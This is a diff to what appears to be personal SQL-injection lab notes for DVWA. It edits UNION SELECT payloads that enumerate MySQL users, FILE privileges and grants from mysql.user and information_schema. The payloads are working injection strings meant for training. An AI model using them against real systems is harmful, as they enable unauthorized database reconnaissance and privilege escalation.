@@ -10,9 +10,9 @@ Search Tag: #sql-injection #union #enumeration-and-discovery #dvwa
 ## 3.2 - Enumerate Database User Privileges
 
 ```sql
-' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'FILE', '->', File_priv) FROM mysql.user#
+' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'FILE', '->', File_priv, '\n') FROM mysql.user#
 
-' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'FILE', '->', File_priv) FROM mysql.user WHERE File_priv = 'Y' AND user = 'dvwa'#
+' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'FILE', '->', File_priv, '\n') FROM mysql.user WHERE File_priv = 'Y' AND user = 'dvwa'#
 
 ' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES#
 
